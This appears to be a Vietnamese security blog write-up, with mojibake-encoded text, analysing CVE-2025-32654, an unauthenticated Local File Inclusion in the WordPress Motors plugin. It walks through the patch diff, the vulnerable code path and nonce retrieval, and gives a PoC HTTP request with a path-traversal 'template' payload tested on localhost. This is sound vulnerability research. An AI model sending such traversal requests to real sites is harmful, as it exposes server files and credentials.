# CVE-2025-32654 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Motors** phiÃªn báº£n **â‰¤ 1.4.71** chá»©a lá»— há»•ng **Local File Inclusion** cho phÃ©p káº» táº¥n cÃ´ng khÃ´ng cáº§n xÃ¡c thá»±c Ä‘iá»u khiá»ƒn tham sá»‘ file trong lá»‡nh `include/require`, tá»« Ä‘Ã³ chÃ¨n hoáº·c Ä‘á»c cÃ¡c tá»‡p cá»¥c bá»™ trÃªn mÃ¡y chá»§ (vÃ­ dá»¥ file cáº¥u hÃ¬nh chá»©a credential), dáº«n tá»›i rÃ² rá»‰ thÃ´ng tin nháº¡y cáº£m vÃ  trong má»™t sá»‘ cáº¥u hÃ¬nh cÃ³ thá»ƒ dáº«n tá»›i thá»±c thi mÃ£.

* **CVE ID**: [CVE-2025-32654](https://www.cve.org/CVERecord?id=CVE-2025-32654)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 1.4.71
* **Patched Versions**: 1.4.72
* **CVSS severity**: High (8.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Motors Plugin](https://wordpress.org/plugins/motors-car-dealership-classified-listings/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Motors**: **1.4.71** (vulnerable) vÃ  **1.4.72** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoáº·c báº¥t ká»³ cÃ´ng cá»¥ so sÃ¡nh (diff) nÃ o Ä‘á»ƒ kiá»ƒm tra vÃ  so sÃ¡nh khÃ¡c biá»‡t giá»¯a hai phiÃªn báº£n.

## Analysis

### Patch diff

**Báº£n lá»—i**:

```php {filename="RegisterActions.php v1.4.71" hl_lines=[2]}
public static function motors_ew_grid_tabs() {
	$template = sanitize_text_field( $_POST['template'] );
	// other logic
}
```

Báº£n lá»—i **chá»‰ lá»c kÃ½ tá»± HTML** báº±ng [`sanitize_text_field()`](https://developer.wordpress.org/reference/functions/sanitize_text_field/), khÃ´ng giá»›i háº¡n Ä‘Æ°á»ng dáº«n, nÃªn attacker cÃ³ thá»ƒ chÃ¨n `../` hoáº·c tÃªn file báº¥t ká»³ => `LFI`.

**Báº£n vÃ¡**:

```php {filename="RegisterActions.php v1.4.72" hl_lines=[2,7]}
public static function motors_ew_grid_tabs() {
	$allowed_templates = array(
		'listing-cars/listing-grid-directory-loop-4',
		'listing-cars/listing-grid-directory-loop-3',
		'listing-cars/listing-grid-directory-loop',
	);
	$template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' );
	if ( ! in_array( $template, $allowed_templates, true ) ) {
		wp_send_json_error( 'Invalid template' );
		return;
	}
	// other logic
}
```

Báº£n vÃ¡ Ã¡p dá»¥ng [`sanitize_file_name()`](https://developer.wordpress.org/reference/functions/sanitize_file_name/) + **whitelist** kiá»ƒm tra há»£p lá»‡, giÃºp khÃ³a cháº·t input vÃ  loáº¡i bá» hoÃ n toÃ n kháº£ nÄƒng khai thÃ¡c thÃ´ng qua tham sá»‘ template.

### Vulnerable Code 

HÃ m `motors_ew_grid_tabs()` Ä‘Æ°á»£c Ä‘Äƒng kÃ½ lÃ m **callback** cho **action hook** cÃ³ tÃªn `"grid_tabs_widget"` thÃ´ng qua Ä‘oáº¡n mÃ£:

```php
add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) );
```

Tiá»n tá»‘ `wp_ajax_nopriv_` cho biáº¿t action nÃ y **khÃ´ng yÃªu cáº§u ngÆ°á»i dÃ¹ng Ä‘Äƒng nháº­p** khi gá»i Ä‘áº¿n endpoint AJAX.
Do Ä‘Ã³, endpoint thá»±c táº¿ cÃ³ thá»ƒ Ä‘Æ°á»£c truy cáº­p cÃ´ng khai qua:

```
/wp-admin/admin-ajax.php?action=grid_tabs_widget
```

Khi Ä‘Ã³ `motors_ew_grid_tabs()` Ä‘Æ°á»£c gá»i: 

```php {filename="RegisterActions.php v1.4.71" hl_lines=[2,8,48]}
public static function motors_ew_grid_tabs() {
	check_ajax_referer( 'motors_grid_tabs', 'security' );

	$listing_types = apply_filters( 'stm_listings_post_type', 'listings' );

	$tab_type = sanitize_text_field( $_POST['tab_type'] );
	$per_page = intval( $_POST['per_page'] );
	$template = sanitize_text_field( $_POST['template'] );
	$img_size = sanitize_text_field( $_POST['img_size'] );

	$args = array(
		'post_type'      => $listing_types,
		'post_status'    => 'publish',
		'posts_per_page' => $per_page,
	);

	if ( 'popular' === $tab_type ) {
		$args = array_merge(
			$args,
			array(
				'orderby'  => 'meta_value_num',
				'meta_key' => 'stm_car_views',
				'order'    => 'DESC',
			)
		);
	}

	$args['meta_query'][] = array(
		'key'     => 'car_mark_as_sold',
		'value'   => '',
		'compare' => '=',
	);

	$template_args = array();
	if ( ! empty( $img_size ) ) {
		$template_args = array(
			'custom_img_size' => $img_size,
		);
	}

	$listings_query = new WP_Query( $args );

	if ( $listings_query->have_posts() ) {
		$output = '';
		ob_start();
		while ( $listings_query->have_posts() ) {
			$listings_query->the_post();
			do_action( 'stm_listings_load_template', $template, $template_args );
		}
		$output .= ob_get_clean();
	}

	wp_send_json(
		array(
			'html' => $output,
		)
	);
}
```

Trong hÃ m `motors_ew_grid_tabs()`, dÃ²ng Ä‘áº§u tiÃªn:

```php
check_ajax_referer( 'motors_grid_tabs', 'security' );
```

thá»±c hiá»‡n **kiá»ƒm tra nonce** Ä‘á»ƒ báº£o vá»‡ khá»i **CSRF (Cross-Site Request Forgery)**.
Náº¿u nonce gá»­i tá»« client khÃ´ng há»£p lá»‡ hoáº·c khÃ´ng tá»“n táº¡i, hÃ m nÃ y sáº½ **dá»«ng toÃ n bá»™ quÃ¡ trÃ¬nh xá»­ lÃ½ AJAX** - nghÄ©a lÃ  cÃ¡c Ä‘oáº¡n logic phÃ­a sau (bao gá»“m xá»­ lÃ½ `$template`, truy váº¥n bÃ i viáº¿t, vÃ  render HTML) sáº½ **khÃ´ng Ä‘Æ°á»£c thá»±c thi**.

```php {filename="RegisterActions.php v1.4.71" hl_lines=[2,8]}
public static function motors_create_nonce() {
	$grid_tabs_widget = wp_create_nonce( 'motors_grid_tabs' );
	// other logic
	wp_localize_script(
		'jquery',
		'mew_nonces',
		array(
			'motors_grid_tabs' => $grid_tabs_widget,
			// other logic
		)
	);
}
```

HÃ m `motors_create_nonce()` táº¡o nonce cho action `'motors_grid_tabs'` báº±ng `wp_create_nonce()` rá»“i truyá»n sang JavaScript qua `wp_localize_script()` dÆ°á»›i biáº¿n `mew_nonces.motors_grid_tabs`.

> [!TIP]
> VÃ¬ lá»— há»•ng nÃ y lÃ  loáº¡i **Unauthenticated**, nÃªn **nonce** khÃ´ng Ä‘Æ°á»£c hiá»ƒn thá»‹ trong khu vá»±c **admin**.
Thay vÃ o Ä‘Ã³, hÃ£y truy cáº­p **trang chá»§** sau khi plugin Ä‘Ã£ Ä‘Æ°á»£c cÃ i Ä‘áº·t Ä‘áº§y Ä‘á»§ cÃ¡c phá»¥ thuá»™c, rá»“i tÃ¬m tá»« khÃ³a `motors_grid_tabs` trong mÃ£ nguá»“n trang Ä‘á»ƒ láº¥y giÃ¡ trá»‹ **nonce** cáº§n thiáº¿t.

{{< figure src="nonce.png" caption="GiÃ¡ trá»‹ nonce hiá»ƒn thá»‹ trong mÃ£ nguá»“n trÃ¬nh duyá»‡t" >}}

NgoÃ i ra, trong mÃ£ nguá»“n trang chá»§ cÃ²n cÃ³ Ä‘oáº¡n JavaScript thá»±c hiá»‡n **gá»i AJAX tá»± Ä‘á»™ng** Ä‘áº¿n endpoint ta Ä‘ang focus:

```
/wp-admin/admin-ajax.php?action=grid_tabs_widget
```

khi trang Ä‘Æ°á»£c táº£i:

```html
<script>
	(function($) {
		$(document).ready(function() {
			$.ajax({
				type: "POST",
				url: ajaxurl,
				dataType: 'json',
				async: true,
				data: 'action=grid_tabs_widget&tab_type=popular&per_page=8&template=listing-cars/listing-grid-directory-loop-4&img_size=&security=' + mew_nonces.motors_grid_tabs,
				success: function(data) {
					if( data.hasOwnProperty('html') ) $('#popular-tab-content').html(data.html);
					updateGridItemTitles();
				},
			});
		});
	})(jQuery)
</script>
```

Äoáº¡n script tá»± Ä‘á»™ng cháº¡y vÃ¬ náº±m trong `$(document).ready()`, nÃªn khi trang load xong, jQuery sáº½ tá»± thá»±c thi hÃ m AJAX.

Táº­n dá»¥ng Ä‘iá»u nÃ y, ta reload trang chá»§ vÃ  báº¯t ajax request báº±ng **BurpSuite**, Ä‘á»ƒ láº¥y cÃ¡c param cáº§n thiáº¿t do plugin cung cáº¥p.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: vi,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 168
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: cyan

action=grid_tabs_widget&tab_type=popular&per_page=8&template=listing-cars/listing-grid-directory-loop-4&img_size=&security=d15dd83890
```

Äáº·t breakpoint trong hÃ m `motors_ew_grid_tabs()` táº¡i vá»‹ trÃ­ xá»­ lÃ½ dá»¯ liá»‡u trÆ°á»›c khi tráº£ vá» cho client:

```php {filename="RegisterActions.php v1.4.71" hl_lines=[4]}
ob_start();
while ( $listings_query->have_posts() ) {
	$listings_query->the_post();
	do_action( 'stm_listings_load_template', $template, $template_args );
}
$output .= ob_get_clean();
```

Äoáº¡n mÃ£ nÃ y chá»‹u trÃ¡ch nhiá»‡m **táº¡o ná»™i dung HTML Ä‘á»™ng** tá»« káº¿t quáº£ truy váº¥n:

* `ob_start()` khá»Ÿi táº¡o bá»™ Ä‘á»‡m Ä‘áº§u ra, táº¡m giá»¯ má»i ná»™i dung Ä‘Æ°á»£c in ra.
* VÃ²ng `while` láº·p qua cÃ¡c bÃ i viáº¿t trong `$listings_query` vÃ  gá»i `do_action( 'stm_listings_load_template', $template, $template_args )` Ä‘á»ƒ render tá»«ng item theo template tÆ°Æ¡ng á»©ng.
* `ob_get_clean()` láº¥y toÃ n bá»™ ná»™i dung Ä‘Ã£ render trong buffer, xÃ³a bá»™ Ä‘á»‡m vÃ  gÃ¡n vÃ o `$output`.

ğŸ‘‰ Káº¿t quáº£: `$output` chá»©a toÃ n bá»™ HTML Ä‘Ã£ Ä‘Æ°á»£c sinh ra, sáºµn sÃ ng gá»­i vá» client qua AJAX.

Khi gá»­i láº¡i request vÃ  quan sÃ¡t báº±ng debugger:

{{< figure src="debug1.png" caption="Debugger Ä‘i qua cÃ¡c logic láº¥y post" >}}

Ta tháº¥y ráº±ng vá»›i cÃ¡c **tham sá»‘ máº·c Ä‘á»‹nh** do plugin gá»­i lÃªn, Ä‘iá»u kiá»‡n `$listings_query->have_posts()` luÃ´n **true**, nÃªn action hook `stm_listings_load_template` Ä‘Æ°á»£c gá»i vÃ  pháº§n xá»­ lÃ½ liÃªn quan Ä‘áº¿n `$template` Ä‘Æ°á»£c thá»±c thi.

Hook `stm_listings_load_template` Ä‘Æ°á»£c Ä‘Äƒng kÃ½ vá»›i callback cÃ¹ng tÃªn:

```php {filename="templates.php v1.4.71" hl_lines=[3]}
function stm_listings_load_template( $__template, $__vars = array() ) {
	extract( $__vars );
	include stm_listings_locate_template( $__template );
}
add_action( 'stm_listings_load_template', 'stm_listings_load_template', 10, 2 );
```

`include` lÃ  má»™t trong nhá»¯ng sink gÃ¢y **LFI** trong WordPress, ta phÃ¢n tÃ­ch `stm_listings_locate_template()` Ä‘á»ƒ xem giÃ¡ trá»‹ thá»±c sá»± Ä‘Æ°á»£c `include` lÃ  gÃ¬ => giÃºp tÃ¹y chá»‰nh payload cho phÃ¹ há»£p

```php {filename="templates.php v1.4.71" hl_lines=[9,10,11,12,13]}
function stm_listings_locate_template( $templates ) {
	$located = false;

	foreach ( (array) $templates as $template ) {
		if ( substr( $template, - 4 ) !== '.php' ) {
			$template .= '.php';
		}

		if ( str_contains( $template, 'partials/' ) ) {
			$located = locate_template( $template );
		} else {
			$located = locate_template( 'listings/' . $template );
		}

		if ( ! ( $located ) ) {
			if ( file_exists( realpath( apply_filters( 'stm_listings_template_file', STM_LISTINGS_PATH, $template ) . '/templates/' . $template ) ) ) {
				$located = realpath( apply_filters( 'stm_listings_template_file', STM_LISTINGS_PATH, $template ) . '/templates/' . $template );
			}
		}

		if ( file_exists( $located ) ) {
			break;
		}
	}

	return apply_filters( 'stm_listings_locate_template', $located, $templates );
}
```

HÃ m `stm_listings_locate_template()` nháº­n tham sá»‘ `$templates`, Ã©p kiá»ƒu vá» máº£ng rá»“i **duyá»‡t qua tá»«ng pháº§n tá»­** Ä‘á»ƒ xÃ¡c Ä‘á»‹nh Ä‘Æ°á»ng dáº«n file template há»£p lá»‡ cáº§n náº¡p.

Cá»¥ thá»ƒ:

* Náº¿u pháº§n tá»­ khÃ´ng cÃ³ háº­u tá»‘ `.php`, hÃ m sáº½ tá»± Ä‘á»™ng ná»‘i thÃªm.
* Náº¿u Ä‘Æ°á»ng dáº«n chá»©a chuá»—i `'partials/'`, nÃ³ gá»i `locate_template( $template )` gÃ¡n giÃ¡ trá»‹ tráº£ vá» cho `$located`.
* NgÆ°á»£c láº¡i, nÃ³ tÃ¬m trong thÆ° má»¥c `'listings/'` vÃ  gÃ¡n giÃ¡ trá»‹ tráº£ vá» cho `$located`.
* Náº¿u váº«n khÃ´ng tÃ¬m tháº¥y, hÃ m thá»­ kiá»ƒm tra trá»±c tiáº¿p trong plugin báº±ng cÃ¡ch ghÃ©p:

```
STM_LISTINGS_PATH . '/templates/' . $template
```

* Khi phÃ¡t hiá»‡n file tá»“n táº¡i (`file_exists()`), vÃ²ng láº·p dá»«ng láº¡i vÃ  tráº£ vá» Ä‘Æ°á»ng dáº«n Ä‘Ã³.

[`locate_template()`](https://developer.wordpress.org/reference/functions/locate_template/) lÃ  hÃ m **core cá»§a WordPress**. NÃ³ tÃ¬m file template trong theme hiá»‡n táº¡i hoáº·c child theme. Náº¿u tÃ¬m tháº¥y, nÃ³ tráº£ vá» Ä‘Æ°á»ng dáº«n Ä‘áº§y Ä‘á»§ Ä‘áº¿n file, cÃ²n khÃ´ng thÃ¬ tráº£ vá» chuá»—i rá»—ng. => Ta cáº§n truyá»n file tá»“n táº¡i.

ğŸ‘‰ Káº¿t quáº£ cuá»‘i cÃ¹ng Ä‘Æ°á»£c tráº£ vá» qua filter `stm_listings_locate_template` vá»›i Ä‘Æ°á»ng dáº«n lÃ  `$locate`

{{< figure src="search1.png" caption="KhÃ´ng cÃ³ filter `stm_listings_locate_template` Ä‘Æ°á»£c Ä‘Äƒng kÃ½" >}}

Khi tÃ¬m vá»›i tá»« khÃ³a `stm_listings_locate_template` trong pháº¡m vi plugin, tÃ´i khÃ´ng tháº¥y filter nÃ o Ä‘Æ°á»£c Ä‘Äƒng kÃ½ => `$locate` sáº½ Ä‘Æ°á»£c tráº£ vá» mÃ  khÃ´ng cÃ³ thay Ä‘á»•i do filter. 

NhÆ° váº­y Ä‘iá»u kiá»‡n cáº§n Ä‘á»ƒ khai thÃ¡c bao gá»“m:
* `template` param chá»©a `partials/` hoáº·c `listings/`
* `../` vá»«a Ä‘á»§ Ä‘á»ƒ `locate_template()` trong tráº£ vá» chuá»—i rá»—ng vÃ  `include` khÃ´ng lá»—i náº¿u Ä‘Æ°á»ng dáº«n khÃ´ng tá»“n táº¡i

## Exploit
### Proof of Concept (PoC)

1. ThÃªm code tráº£ vá» trong `wp-config.php` Ä‘á»ƒ thá»­ nghiá»‡m 

```php
<?php
echo "payload"
```

2. Gá»­i POST request chá»©a LFI payload

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: vi,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 123
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: cyan

action=grid_tabs_widget&tab_type=popular&per_page=8&template=/partials/../../../../../payload&img_size=&security=d15dd83890
```

**Result**:

{{< figure src="result.png" caption="Káº¿t quáº£ LFI thÃ nh cÃ´ng" >}}

## Conclusion

CVE-2025-32654 lÃ  má»™t **LFI** trong plugin **Motors â‰¤1.4.71**: tham sá»‘ `template` khÃ´ng Ä‘Æ°á»£c rÃ ng buá»™c, cho phÃ©p path traversal vÃ  `include()` file báº¥t ká»³. Endpoint cÃ´ng khai (`wp_ajax_nopriv_`) vÃ  nonce xuáº¥t trÃªn frontâ€‘end giÃºp káº» táº¥n cÃ´ng dá»… khai thÃ¡c. Lá»— há»•ng Ä‘Æ°á»£c vÃ¡ trong **v1.4.72** báº±ng cÃ¡ch chuáº©n hoÃ¡ tÃªn file vÃ  kiá»ƒm tra **whitelist**.

## Key takeaways

* KhÃ´ng dÃ¹ng input thÃ´ Ä‘á»ƒ build Ä‘Æ°á»ng dáº«n cho `include`.
* Æ¯u tiÃªn **whitelist** template/Ä‘Æ°á»ng dáº«n há»£p lá»‡.
* Chuáº©n hoÃ¡ (e.g. `sanitize_file_name()`/`sanitize_key()`), dÃ¹ng `realpath()` Ä‘á»ƒ so sÃ¡nh vá»›i thÆ° má»¥c gá»‘c.
* Náº¿u endpoint pháº£i cÃ´ng khai, báº¯t buá»™c kiá»ƒm soÃ¡t cháº·t input chá»© Ä‘á»«ng chá»‰ trÃ´ng vÃ o nonce.

## References

[File Inclusion/Path traversal â€” Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress Motors Plugin <= 1.4.71 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/motors-car-dealership-classified-listings/vulnerability/wordpress-motors-plugin-1-4-65-local-file-inclusion-vulnerability-2?_s_id=cve)


---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-14-cve-2025-32654/  

